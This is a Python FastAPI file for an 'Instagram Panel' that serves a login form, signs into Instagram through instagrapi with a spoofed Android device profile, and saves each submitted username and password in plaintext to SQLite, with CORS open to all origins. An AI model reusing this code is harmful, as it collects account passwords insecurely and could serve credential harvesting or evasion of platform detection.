from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List
from instagrapi import Client
import sqlite3
import os

app = FastAPI()

app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

DB_FILE = "database.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('CREATE TABLE IF NOT EXISTS accounts (username TEXT PRIMARY KEY, password TEXT)')
    conn.commit()
    conn.close()

init_db()

class LoginData(BaseModel):
    username: str
    password: str

@app.get("/", response_class=HTMLResponse)
def index():
    return """
    <html>
    <body>
        <h1>Instagram Panel (Proxy Free)</h1>
        <input type="text" id="username" placeholder="Username"><br>
        <input type="password" id="password" placeholder="Password"><br>
        <button onclick="login()">Login</button>
        <p id="status"></p>
        <script>
            async function login() {
                let u = document.getElementById('username').value;
                let p = document.getElementById('password').value;
                let res = await fetch('/api/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({username: u, password: p})
                });
                let data = await res.json();
                document.getElementById('status').innerText = res.ok ? "Success!" : data.detail;
            }
        </script>
    </body>
    </html>
    """

@app.post("/api/login")
def login(data: LoginData):
    cl = Client()
    # Device profile set kar di taaki account safe rahe
    cl.set_device({"app_version": "330.0.0.38.118", "android_version": 34, "android_model": "Pixel 7", "android_device": "panther", "cpu": "gs201"})
    
    sf = f"session_{data.username}.json"
    
    try:
        # Pura process bina proxy ke chalega
        cl.login(data.username, data.password)
        cl.dump_settings(sf)
        
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO accounts (username, password) VALUES (?, ?)", (data.username, data.password))
        conn.commit()
        conn.close()
        return {"status": "success"}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))
